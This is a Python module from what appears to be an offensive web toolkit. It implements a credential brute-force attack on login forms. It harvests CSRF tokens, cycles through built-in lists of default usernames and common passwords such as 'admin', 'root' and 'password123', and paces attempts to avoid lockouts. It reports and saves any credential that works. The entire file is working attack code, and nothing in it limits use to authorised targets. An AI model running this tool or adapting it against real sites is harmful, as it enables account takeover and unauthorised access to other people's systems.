"""
Credential brute-force for login forms.

Posts a list of (email, password) combinations against a login URL,
classifies responses as success or failure, and reports the first
working credential.

Design:
  - CSRF-aware: scrapes tokens from the login page before submitting.
  - Rate-limit aware: backs off on 429/503, respects Retry-After.
  - Configurable failure detection: either success marker (if a known
    success string is provided) or HTTP-level analysis (redirect after
    POST means success).
  - Async, but concurrency defaults to 1. Brute-force works best slow;
    fast triggers lockouts.
"""

import asyncio
import re
import time
from pathlib import Path

from core.http import new_session, fetch, RateLimiter, parse_cookie_string
from core.output import info, success, warn, error
from vuln.sqli import find_tokens


DEFAULT_USER_AGENT = "Mozilla/5.0 (compatible; toolkit-brute/0.1)"

# Built-in short wordlist. Add a file with --wordlist for more.
BUILTIN_PASSWORDS = [
    "password", "Password1", "Password123", "password123",
    "admin", "admin123", "administrator",
    "letmein", "welcome", "welcome1",
    "changeme", "test", "test123", "demo",
    "qwerty", "qwerty123", "123456", "12345678", "abc123",
    "craft", "craftcms", "drupal", "wordpress",
    "root", "toor", "pass", "secret",
]

BUILTIN_EMAILS = [
    "admin", "admin@admin", "admin@test.test",
    "administrator@admin", "webmaster@admin",
    "root", "user", "test",
]


# ---------------------------------------------------------------------
# Response classification
# ---------------------------------------------------------------------

def classify_login_response(status, headers, body, success_marker=None,
                            failure_marker=None, pre_login_url=None,
                            post_login_url=None):
    """Return one of "success", "failure", "unknown".

    Priority order:
      1. Explicit success marker found in body -> success
      2. Explicit failure marker found in body -> failure
      3. HTTP redirect after POST + different URL -> success
      4. Same page returned -> failure
    """
    body_low = (body or "").lower()

    if success_marker and success_marker.lower() in body_low:
        return "success"
    if failure_marker and failure_marker.lower() in body_low:
        return "failure"

    if status in (301, 302, 303, 307, 308):
        return "success"

    # If we requested a login URL and got the same URL back, likely failure.
    if pre_login_url and post_login_url:
        if pre_login_url == post_login_url:
            return "failure"

    return "unknown"


# ---------------------------------------------------------------------
# Single credential attempt
# ---------------------------------------------------------------------

async def try_one(session, login_url, email, password,
                  email_field="email", password_field="password",
                  rate_limiter=None, csrf_jar=None,
                  success_marker=None, failure_marker=None,
                  verbose=False):
    """Attempt one credential. Returns dict with 'success' and 'evidence'."""
    data = {
        email_field: email,
        password_field: password,
    }
    if csrf_jar:
        for k, v in csrf_jar.tokens.items():
            # Match the field name used in the form
            data[k] = v

    try:
        async with session.post(
            login_url,
            data=data,
            headers={
                "Accept": "text/html,application/xhtml+xml",
            },
            allow_redirects=False,
        ) as resp:
            body = await resp.text(errors="ignore")
            status = resp.status
            headers = dict(resp.headers)
            location = headers.get("Location", "")
    except Exception as e:
        return {"success": False,
                "evidence": f"transport: {type(e).__name__}"}

    verdict = classify_login_response(
        status, headers, body,
        success_marker=success_marker,
        failure_marker=failure_marker,
        pre_login_url=login_url,
        post_login_url=location or login_url,
    )

    if verbose:
        info(f"  attempt {email}:{password!r} -> status={status} "
             f"verdict={verdict}")

    return {
        "success": verdict == "success",
        "evidence": f"status={status} verdict={verdict} "
                    f"location={location!r}",
    }


# ---------------------------------------------------------------------
# Main runner
# ---------------------------------------------------------------------

async def brute_force(login_url, emails, passwords,
                      email_field="email", password_field="password",
                      success_marker=None, failure_marker=None,
                      rate=2.0, verbose=False, max_attempts=None):
    """Try each (email, password) combination against the login URL.

    Returns a dict with 'credential' (or None), 'attempts', and 'elapsed'.
    """
    session = new_session()
    rate_limiter = RateLimiter(rate=rate)
    csrf_jar = None

    started = time.monotonic()
    attempts = 0
    hit = None

    try:
        # --- Fetch the login page to grab CSRF tokens ---
        info("fetching login page for CSRF tokens...")
        r = await fetch(session, login_url, rate_limiter)
        if r is not None:
            _, headers, body, _ = r
            tokens = find_tokens(body, headers)
            if tokens:
                class Jar:
                    def __init__(self, t):
                        self.tokens = t
                csrf_jar = Jar(tokens)
                info(f"cached {len(tokens)} CSRF token(s): "
                     f"{', '.join(tokens.keys())}")

        # --- Iterate attempts ---
        info(f"starting brute-force: {len(emails)} emails × "
             f"{len(passwords)} passwords = {len(emails) * len(passwords)} attempts")

        for email in emails:
            for password in passwords:
                attempts += 1
                if max_attempts and attempts > max_attempts:
                    warn(f"hit max_attempts={max_attempts}, stopping")
                    break

                result = await try_one(
                    session, login_url, email, password,
                    email_field=email_field,
                    password_field=password_field,
                    rate_limiter=rate_limiter,
                    csrf_jar=csrf_jar,
                    success_marker=success_marker,
                    failure_marker=failure_marker,
                    verbose=verbose,
                )

                # Detect rate limiting
                if "429" in result.get("evidence", ""):
                    warn("429 received, backing off")
                    await asyncio.sleep(5.0)

                if result["success"]:
                    hit = {"email": email, "password": password}
                    success(f"FOUND: {email}:{password}")
                    return {
                        "credential": hit,
                        "attempts": attempts,
                        "elapsed": time.monotonic() - started,
                        "evidence": result["evidence"],
                    }
                else:
                    # Rate limit politely
                    await rate_limiter.wait()
            else:
                continue
            break

    finally:
        await session.close()

    return {
        "credential": None,
        "attempts": attempts,
        "elapsed": time.monotonic() - started,
        "evidence": "",
    }


# ---------------------------------------------------------------------
# Wordlist loading
# ---------------------------------------------------------------------

def load_wordlist(path):
    p = Path(path)
    if not p.exists():
        warn(f"wordlist not found: {path}")
        return []
    return [line.strip() for line in p.read_text().splitlines()
            if line.strip() and not line.startswith("#")]


# ---------------------------------------------------------------------
# CLI entry
# ---------------------------------------------------------------------

async def run(login_url, emails, passwords,
              email_field="email", password_field="password",
              success_marker=None, failure_marker=None,
              rate=2.0, verbose=False, max_attempts=None, output_file=None):
    info(f"brute-forcing {login_url}")
    result = await brute_force(
        login_url, emails, passwords,
        email_field=email_field, password_field=password_field,
        success_marker=success_marker, failure_marker=failure_marker,
        rate=rate, verbose=verbose, max_attempts=max_attempts,
    )

    print()
    if result["credential"]:
        success(f"credential found: "
                f"{result['credential']['email']}:{result['credential']['password']}")
        success(f"after {result['attempts']} attempts "
                f"({result['elapsed']:.1f}s)")
    else:
        warn(f"no credential found after {result['attempts']} attempts "
             f"({result['elapsed']:.1f}s)")

    if output_file:
        import json
        Path(output_file).write_text(json.dumps(result, indent=2, default=str))
        success(f"report saved to {output_file}")

    return result